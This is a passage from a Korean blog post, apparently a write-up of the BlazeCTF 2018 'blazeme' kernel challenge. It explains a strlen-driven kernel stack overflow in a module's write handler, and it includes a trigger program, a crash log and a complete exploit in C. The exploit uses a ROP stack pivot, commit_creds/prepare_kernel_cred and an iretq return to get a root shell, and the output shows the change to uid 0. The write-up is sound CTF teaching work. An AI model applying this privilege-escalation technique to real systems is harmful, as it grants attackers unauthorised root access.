+--------+--------+--------+----------------+
</pre></table></code></div></div><p>이 상태에서 A와 C 영역을 Free한다면 아래와 같은 모습이 될 것이다.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>+0x00    +0x40    +0x80    +0xc0
v        v        v        v
+---+-----------------+---------------------+
|   |    |        |   |    |                |
| 0 |    |        | N |    |                |
| x | .. | B * 64 | U | .. | More Chunks... |
| 8 |    |        | L |    |                |
| 0 |    |        | L |    |                |
+---+----+--------+---+----+----------------+
</pre></table></code></div></div><h1 id="finding-vulnerability">Finding Vulnerability</h1><p>먼저 아래 그림을 다시 한번 살펴보자.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>+0x00    +0x40    +0x80    +0xc0
v        v        v        v
+-------------------------------------------+
|        |        |        |                |
|        |        |        |                |
| A * 64 | B * 64 | C * 64 | More Chunks... |
|        |        |        |                |
|        |        |        |                |
+--------+--------+--------+----------------+
</pre></table></code></div></div><p>만약, 위와 같이 A B C 세 청크 모두 할당이 된 상태에서, <code class="language-plaintext highlighter-rouge">strlen(+0x00)</code>이 실행된다면 어떻게 될까? <code class="language-plaintext highlighter-rouge">strlen()</code> 함수는 NULL 바이트까지의 길이를 세므로, 메타데이터와 NULL Byte가 없는 위와 같은 조건의 힙 영역에서는 <code class="language-plaintext highlighter-rouge">A의 길이 64 바이트</code>가 아닌 <code class="language-plaintext highlighter-rouge">A+B+C의 길이 192+@ 바이트</code>가 반환되게 된다.</p><p>이제 아래 코드를 확인해보자.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="n">kbuf</span> <span class="o">=</span> <span class="n">kmalloc</span><span class="p">(</span><span class="n">KBUF_LEN</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">kbuf</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"blazeme_write malloc fail</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">ret</span> <span class="o">=</span> <span class="n">ERR_BLAZEME_MALLOC_FAIL</span><span class="p">;</span>
	<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="n">kbuf</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">count</span><span class="p">))</span> <span class="p">{</span>
	<span class="n">kfree</span><span class="p">(</span><span class="n">kbuf</span><span class="p">);</span>
	<span class="n">kbuf</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="n">kbuf</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">strncat</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="n">kbuf</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">kbuf</span><span class="p">));</span>
	<span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"%s"</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>위 코드는 문제의 함수<code class="language-plaintext highlighter-rouge">blazeme_write()</code>이다. 함수 내에서 <code class="language-plaintext highlighter-rouge">kmalloc()</code>을 통해 동적 메모리를 할당하지만, <code class="language-plaintext highlighter-rouge">kfree()</code>가 호출되는 조건은 <b>‘copy_from_user() 함수 호출시 복사되지 않은 바이트가 있을 경우’</b><sup id="fnref:copy_to_user" role="doc-noteref"><a href="#fn:copy_to_user" class="footnote" rel="footnote">4</a></sup>이다. 그러므로 정상적으로 값이 복사된 경우 <code class="language-plaintext highlighter-rouge">kfree()</code>가 호출되지 않아 청크들이 힙 영역에 계속 쌓이게 된다.</p><p>이후 <code class="language-plaintext highlighter-rouge">strncat()</code>을 호출할 때 길이 값으로 <code class="language-plaintext highlighter-rouge">strlen()</code> 함수를 호출하게 되는데, 위에서 말한대로 해제되지 않은 청크들이 나열되었을 때 <code class="language-plaintext highlighter-rouge">strlen()</code>이 호출된다면 NULL 바이트까지의 길이가 반환되므로 512바이트 길이의 배열 <code class="language-plaintext highlighter-rouge">str[512]</code>가 overflow되어 스택의 ret값을 덮게 된다.</p><p>간단한 코드를 짜서 확인해보자.</p><p><strong>ex.c</strong></p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;fcntl.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>

	<span class="kt">char</span> <span class="n">payload</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">64</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
		<span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'A'</span><span class="p">;</span>

	<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/blazeme"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
	<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>compile</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gcc <span class="nt">-static</span> <span class="nt">-O2</span> <span class="nt">-Wall</span> ex.c <span class="nt">-o</span> ex
</pre></table></code></div></div><p>qemu 내에는 gcc가 설치되어 있지 않아서 filesystem을 mount한 후 넣어줬다.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>root@pwn:~/images# <span class="nb">ls
</span>blazeme.c  bzImage  ex  ex.c  rootfs.ext2  run.sh  solve.c
root@pwn:~/images# <span class="nb">mkdir </span>mnt
root@pwn:~/images# mount <span class="nt">-t</span> ext2 rootfs.ext2 ./mnt
root@pwn:~/images# <span class="nb">ls</span> ./mnt
bin  dev  etc  lib  lib64  linuxrc  lost+found  media  mnt  opt  proc  root  run  sbin  sys  tmp  usr  var
root@pwn:~/images# <span class="nb">cp</span> ./ex ./mnt/
root@pwn:~/images# umount ./mnt
root@pwn:~/images#
</pre></table></code></div></div><p>qemu를 실행시켜 트리거링 코드를 실행시킨다.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>root@pwn:~/images# ./run.sh
WARNING: Image format was not specified <span class="k">for</span> <span class="s1">'rootfs.ext2'</span> and probing guessed raw.
         Automatically detecting the format is dangerous <span class="k">for </span>raw images, write operations on block 0 will be restricted.
         Specify the <span class="s1">'raw'</span> format explicitly to remove the restrictions.
qemu-system-x86_64: warning: TCG doesn<span class="s1">'t support requested feature: CPUID.01H:ECX.vmx [bit 5]

Welcome to Buildroot
buildroot login: blazeme
Password:
login: can'</span>t change directory to <span class="s1">'/home/blazeme'</span>
<span class="nv">$ </span><span class="nb">ls
</span>bin         lib         media       root        tmp
dev         lib64       mnt         run         usr
etc         linuxrc     opt         sbin        var
ex          lost+found  proc        sys
<span class="nv">$ </span>./ex
Segmentation fault
<span class="err">$</span>
</pre></table></code></div></div><p>취약점이 트리거링되고, 세그폴트가 떴다. <code class="language-plaintext highlighter-rouge">dmesg</code> 명령을 통해 커널 로그를 확인해보자!</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="nv">$ </span>dmesg
...
...
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
...
...
BUG: stack guard page was hit at 00000000a8a5c2a5 <span class="o">(</span>stack is 00000000dad4aef7..000000008ca3b93b<span class="o">)</span>
kernel stack overflow <span class="o">(</span>page fault<span class="o">)</span>: 0000 <span class="o">[</span><span class="c">#1] SMP NOPTI</span>
Modules linked <span class="k">in</span>: blazeme<span class="o">(</span>O<span class="o">)</span>
CPU: 0 PID: 98 Comm: ex Tainted: G           O     4.15.0 <span class="c">#1</span>
Hardware name: QEMU Standard PC <span class="o">(</span>i440FX + PIIX, 1996<span class="o">)</span>, BIOS 1.10.2-1ubuntu1 04/01/2014
RIP: 0010:strncat+0x37/0x50
RSP: 0018:ffffc9000015fc30 EFLAGS: 00000206
RAX: ffffc9000015fc40 RBX: 0000000000000040 RCX: ffffc90000160001
RDX: ffffc90000161c86 RSI: ffff88000295437b RDI: ffffc9000015fc40
RBP: ffffc9000015fc30 R08: 0000000000000041 R09: 4141414141414141
R10: 4141414141414141 R11: 4141414141414141 R12: 00007ffeeccec270
R13: 00007ffeeccec270 R14: 0000000000000000 R15: ffffc9000015ff20
FS:  00000000006bd880<span class="o">(</span>0000<span class="o">)</span> GS:ffff880003c00000<span class="o">(</span>0000<span class="o">)</span> knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: ffffc90000160000 CR3: 00000000029dc000 CR4: 00000000000006f0
Call Trace:
 blazeme_write+0x124/0x140 <span class="o">[</span>blazeme]
Code: 80 3f 00 48 89 f9 74 09 48 83 c1 01 80 39 00 75 f7 48 01 ca eb 05 48 39 d1 74 18 48 83 c6 01 44 0f b6 46 ff 48 83 c1 01 45 84 c0 &lt;44&gt; 88 41 ff 75 e5 5d c3 c6 01 00 5d c3 66 90 66 2e 0f 1f 84 00
RIP: strncat+0x37/0x50 RSP: ffffc9000015fc30
<span class="nt">---</span><span class="o">[</span> end trace 2c70b86c00933abe <span class="o">]</span><span class="nt">---</span>
</pre></table></code></div></div><p>strncat 위치에서 kernel stack overflow가 떴다.</p><h1 id="exploitation">Exploitation</h1><p>Kernel Stack BOF를 통해 rip를 제어할 수 있게 되었으므로</p><h2 id="추가중">추가중</h2><p><strong>Final Exploit Code</strong></p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/mman.h&gt;
</span>
<span class="k">struct</span> <span class="n">TrapFrame</span><span class="p">{</span>
	<span class="kt">void</span><span class="o">*</span> <span class="n">rip</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_cs</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_rflags</span><span class="p">;</span>
	<span class="kt">void</span><span class="o">*</span> <span class="n">rsp</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_ss</span><span class="p">;</span>
<span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">));</span>

<span class="kt">void</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">prepare_kernel_cred</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">);</span>
<span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">commit_creds</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">);</span>
<span class="k">struct</span> <span class="n">TrapFrame</span> <span class="n">tf</span><span class="p">;</span>

<span class="c1">// commit cred</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">lpe</span><span class="p">()</span> <span class="p">{</span><span class="n">commit_creds</span><span class="p">(</span><span class="n">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">));}</span>

<span class="c1">// get shell</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">shell</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
	<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">save</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">asm</span><span class="p">(</span>
		<span class="s">"xor %rax, %rax;"</span>
		<span class="s">"mov %cs, %ax;"</span>
		<span class="s">"pushq %rax; popq tf+8;"</span>
		<span class="s">"pushfq; popq tf+16;"</span>
		<span class="s">"pushq %rsp; popq tf+24;"</span>
		<span class="s">"mov %ss, %ax;"</span>
		<span class="s">"pushq %rax; popq tf+32;"</span>
	<span class="p">);</span>
	<span class="n">tf</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">shell</span><span class="p">;</span>
	<span class="n">tf</span><span class="p">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="mh">0x5DFF0000</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">restore</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">asm</span><span class="p">(</span>
		<span class="s">"movq $tf, %rsp;"</span>
		<span class="s">"swapgs ;"</span>
		<span class="s">"iretq;"</span>
	<span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">root_shell</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">lpe</span><span class="p">();</span>
	<span class="n">restore</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">commit_creds</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="mh">0xFFFFFFFF81063960ull</span><span class="p">;</span>
	<span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="mh">0xFFFFFFFF81063B50ull</span><span class="p">;</span>
	<span class="n">save</span><span class="p">();</span>
	<span class="c1">// 0xffffffff814d2720: mov esp, 0x5DFFB7B0 ; ret  ;  (1 found)</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="mh">0x5DFF0000</span><span class="p">,</span> <span class="mh">0x10000</span><span class="p">,</span>
	<span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">,</span> <span class="mh">0x32</span> <span class="o">|</span> <span class="n">MAP_POPULATE</span> <span class="o">|</span> <span class="n">MAP_FIXED</span> <span class="o">|</span> <span class="n">MAP_GROWSDOWN</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="n">mem</span><span class="p">[</span><span class="mh">0xB7B0</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">root_shell</span><span class="p">;</span>

	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">gadget</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">8</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
	<span class="n">gadget</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff814d2720ull</span><span class="p">;</span>

	<span class="kt">char</span> <span class="n">chunk</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
	<span class="n">strncpy</span><span class="p">(</span><span class="n">chunk</span><span class="p">,</span> <span class="s">"AA"</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
	<span class="n">strncpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chunk</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">gadget</span><span class="p">,</span> <span class="mi">62</span><span class="p">);</span>

	<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/blazeme"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
	<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">chunk</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

<span class="p">}</span>
</pre></table></code></div></div><h2 id="result">Result</h2><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>Welcome to Buildroot
buildroot login: blazeme
Password:
login: can<span class="s1">'t change directory to '</span>/home/blazeme<span class="s1">'
$ ls
bin         lib64       mnt         run         tmp
dev         linuxrc     opt         sbin        usr
etc         lost+found  proc        solve       var
lib         media       root        sys
$ id
uid=1000(blazeme) gid=1000(blazeme) groups=1000(blazeme)
$ ./solve
$ id
uid=0(root) gid=0(root)
$
</span></pre></table></code></div></div><h1 id="references">References</h1><p>[blazeme write-up] <a href="https://devcraft.io/2018/04/25/blazeme-blaze-ctf-2018.html">https://devcraft.io/2018/04/25/blazeme-blaze-ctf-2018.html</a></p><p>[kernel exploit(wikicon 발표자료)] <a href="https://duasynt.com/slides/smep_bypass.pdf">https://duasynt.com/slides/smep_bypass.pdf</a></p><p>[인라인 어셈블리 기초] <a href="https://wiki.kldp.org/KoreanDoc/html/EmbeddedKernel-KLDP/app3.basic.html">https://wiki.kldp.org/KoreanDoc/html/EmbeddedKernel-KLDP/app3.basic.html</a></p><div class="footnotes" role="doc-endnotes"><ol><li id="fn:fops" role="doc-endnote"><p><a href="https://chardoc.tistory.com/8">https://chardoc.tistory.com/8</a> <a href="#fnref:fops" class="reversefootnote" role="doc-backlink">&#8617;</a></p><li id="fn:fops_exploit" role="doc-endnote"><p><a href="https://procdiaru.tistory.com/82">https://procdiaru.tistory.com/82</a> <a href="#fnref:fops_exploit" class="reversefootnote" role="doc-backlink">&#8617;</a></p><li id="fn:slab_allocator" role="doc-endnote"><p><a href="http://jake.dothome.co.kr/slub/">http://jake.dothome.co.kr/slub/</a> <a href="#fnref:slab_allocator" class="reversefootnote" role="doc-backlink">&#8617;</a></p><li id="fn:copy_to_user" role="doc-endnote"><p><a href="https://blog.naver.com/PostView.nhn?blogId=ryutuna&amp;logNo=100184443085&amp;proxyReferer=https%3A%2F%2Fwww.google.com%2F">https://blog.naver.com/PostView.nhn?blogId=ryutuna&amp;logNo=100184443085&amp;proxyReferer=https%3A%2F%2Fwww.google.com%2F</a> <a href="#fnref:copy_to_user" class="reversefootnote" role="doc-backlink">&#8617;</a></p></ol></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/pwn/'>pwn</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux-kernel/" class="post-tag no-text-decoration" >linux kernel</a> <a href="/tags/exploit/" class="post-tag no-text-decoration" >exploit</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=blazeme - BlazeCTF 2018 - do:pwn()&url=https://nonetype.kr/posts/BlazeCTF2018-blazeme-write-up/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=blazeme - BlazeCTF 2018 - do:pwn()&u=https://nonetype.kr/posts/BlazeCTF2018-blazeme-write-up/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=blazeme - BlazeCTF 2018 - do:pwn()&url=https://nonetype.kr/posts/BlazeCTF2018-blazeme-write-up/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/DLL-Hijacking/">DLL Hijacking Note</a><li><a href="/posts/BlazeCTF2018-blazeme-write-up/">blazeme - BlazeCTF 2018</a><li><a href="/posts/Linux-Kernel-Exploit-Development-lab1/">Linux Kernel Exploit Development (Part 1/10)</a><li><a href="/posts/Linux-Kernel-Exploit-Development-lab2/">Linux Kernel Exploit Development (Part 2/10)</a><li><a href="/posts/Linux-Kernel-Exploit-Development-lab3/">Linux Kernel Exploit Development (Part 3/10)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/debugging/">debugging</a> <a class="post-tag" href="/tags/tutorial/">tutorial</a> <a class="post-tag" href="/tags/tips/">tips</a> <a class="post-tag" href="/tags/firefox/">firefox</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/1-day/">1-day</a> <a class="post-tag" href="/tags/analysis/">analysis</a> <a class="post-tag" href="/tags/ctf/">ctf</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Linux-Kernel-Exploit-Development-lab1/"><div class="card-body"> <span class="timeago small" > Sep 23, 2019 <i class="unloaded">2019-09-23T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Linux Kernel Exploit Development (Part 1/10)</h3><div class="text-muted small"><p> Linux Kernel Exploit Development with VMware - Lab1::Debugging Environment 목차 목차 Debugging Environment Debugger Attach Debug Program Debugging Environment 우선 디버깅 환경을 살펴보니 MasterVM와...</p></div></div></a></div><div class="card"> <a href="/posts/Linux-Kernel-Exploit-Development-lab2/"><div class="card-body"> <span class="timeago small" > Sep 23, 2019 <i class="unloaded">2019-09-23T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Linux Kernel Exploit Development (Part 2/10)</h3><div class="text-muted small"><p> Linux Kernel Exploit Development with VMware - Lab2::Module Debugging 목차 목차 The Kernel Module Debugger Attach to Kernel Module Debug Kernel Module The Kernel Module TestVM의 mod_sam...</p></div></div></a></div><div class="card"> <a href="/posts/Linux-Kernel-Exploit-Development-lab3/"><div class="card-body"> <span class="timeago small" > Sep 23, 2019 <i class="unloaded">2019-09-23T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Linux Kernel Exploit Development (Part 3/10)</h3><div class="text-muted small"><p> Linux Kernel Exploit Development with VMware - Lab3::Privilege Escalation 목차 목차 Privilege Escalation do: LPE() do: LPE() - automated References Privilege Escalation 커널 권한 상승은 보통 ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Kernel-Debug-With-Vmware/" class="btn btn-outline-primary" prompt="Older"><p>Linux Kernel debugging with Vmware</p></a> <a href="/posts/Kernel_Debug_With_Qemu/" class="btn btn-outline-primary" prompt="Newer"><p>Linux Kernel debugging with Qemu</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/nonetype_pwn">Wonyoung Jung</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/debugging/">debugging</a> <a class="post-tag" href="/tags/tutorial/">tutorial</a> <a class="post-tag" href="/tags/tips/">tips</a> <a class="post-tag" href="/tags/firefox/">firefox</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/1-day/">1 day</a> <a class="post-tag" href="/tags/analysis/">analysis</a> <a class="post-tag" href="/tags/ctf/">ctf</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://nonetype.kr{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
